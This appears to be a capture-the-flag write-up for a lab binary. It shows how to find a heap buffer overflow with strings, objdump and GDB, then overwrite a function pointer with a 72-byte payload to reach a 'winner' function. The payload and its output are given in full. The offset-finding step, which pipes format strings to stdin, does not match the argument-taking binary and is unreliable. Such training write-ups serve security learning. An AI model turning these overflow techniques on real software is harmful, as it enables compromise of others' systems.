# ex10 README

## Objective

The goal of this exercise is to exploit a vulnerability to see the message "level passed".

## Steps

### 1\. Initial Setup

Start by examining the binary using common tools:

```sh
strings bin
objdump -t bin
gdb -q ./bin
```

### 2\. Analyze the Binary with `strings`

Running `strings` on the binary provided some useful information:

```plaintext
strings bin
```

Key strings found:

- `strcpy`
- `puts`
- `printf`
- `malloc`
- "level passed"
- "level has not been passed"
- "data is at %p, fp is at %p"

These strings indicate potential points of interest and vulnerabilities.

### 3\. Examine Symbols with `objdump`

Using `objdump` to list symbols:

```sh
objdump -t bin
```

Key functions found:

- `08048464 g F .text 00000014 winner`
- `08048478 g F .text 00000014 nowinner`

The goal is to redirect execution to the `winner` function (`0x08048464`).

### 4\. Disassemble the `main` Function with GDB

Start GDB and set a breakpoint at `main`:

```sh
gdb -q ./bin
(gdb) break main
(gdb) run
(gdb) disassemble main
```

Key points from disassembly:

```plaintext
0x080484ac <+32>: call   0x8048388 <malloc@plt>
0x080484f2 <+102>: call   0x8048368 <strcpy@plt>
0x080484fd <+113>: call   *%eax
```

### 5\. Determine the Memory Layout

Run the program with a simple input and inspect memory:

```sh
./bin AAAA
```

GDB output:

```plaintext
(gdb) x/32x $esp
0xbfcccce0: 0x08048520 0x080483b0 0x00000000 0xb758d64d
...
0xbfcccda4: 0x00000002 0xbfcccda4 0xbfcccdb0 0xb771fcea
...
0xbfcccdf0: 0x08048564 0x00000000 0x00000000 0x00000000
```

### 6\. Find the Correct Offset

Run a Python script to determine the exact offset:

```sh
for i in $(seq 1 100); do
    python -c "print('A'*$i + ' %p' * 10)" | ./bin;
done
```

Observe the output to find where the `AAAA...` sequence appears.

### 7\. Craft the Payload

We determined that the function pointer is located 72 bytes into the allocated buffer. The payload needs to overwrite this pointer with the address of the `winner` function (`0x08048464`).

### Example Payload Construction

Construct the payload with 72 'A' characters followed by the `winner` address:

```sh
python -c "print('A'*72 + '\x64\x84\x04\x08')"
```

### 8\. Provide Payload as an Argument

Run the program with the crafted payload as an argument:

```sh
./bin $(python -c "print('A'*72 + '\x64\x84\x04\x08')")
```

### 9\. Verify the Output

Successful output:

```plaintext
data is at 0x93b9008, fp is at 0x93b9050
level passed
```

### Conclusion

By analyzing the binary and using trial and error to determine the exact buffer layout and function pointer location, we successfully crafted a payload to redirect execution to the `winner` function, printing "level passed".

### Challenges and Learnings

- **Challenge**: Identifying the exact offset to the function pointer.
- **Solution**: Systematic testing and memory inspection with GDB.
- **Learning**: The importance of understanding heap memory layout and careful payload construction.

### Summary

1. **Analyze Binary**: Used `strings`, `objdump`, and GDB to understand the binary.
2. **Determine Offset**: Found the exact offset to the function pointer using a systematic approach.
3. **Craft Payload**: Created a payload to overwrite the function pointer with the address of the `winner` function.
4. **Execute Payload**: Successfully executed the payload to print "level passed".

By following these steps and understanding the exploitation process, we successfully completed the level.
